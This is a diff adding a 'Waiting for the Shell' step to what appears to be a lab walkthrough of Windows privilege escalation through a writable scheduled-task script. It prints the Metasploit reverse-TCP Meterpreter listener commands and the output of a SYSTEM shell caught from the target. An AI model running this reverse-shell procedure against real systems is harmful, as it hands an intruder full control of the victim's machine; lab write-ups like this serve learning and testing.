@@ -241,3 +241,35 @@ Remove-Item C:\DevTools\*.log
 C:\privEsc\rev.exe
 ```
 The last line was my payload. The next time the scheduled task runs the script, it will hit that line and execute `rev.exe` as `SYSTEM`.
+
+## Step 6 — Waiting for the Shell
+
+I started a Metasploit listener on Kali and waited. The task runs every minute so I did not have to do anything else.
+
+```bash
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.5.128
+set lport 4444
+run
+```
+**Output:**
+
+```
+[*] Started reverse TCP handler on 192.168.5.128:4444
+```
+
+### Metasploit Caught the Connection
+
+```
+[*] Sending stage (244806 bytes) to 192.168.5.144
+[*] Meterpreter session 1 opened (192.168.5.128:4444 -> 192.168.5.144:50247) at 2026-06-24 01:49:16 -0400
+
+meterpreter >
+```
+<p align="center">
+  <img src="images/step6-1.png" width="600">
+</p>
+
+The scheduled task ran CleanUp.ps1 as SYSTEM, hit the injected line, and executed rev.exe — giving me a Meterpreter shell back on Kali without me doing anything else.
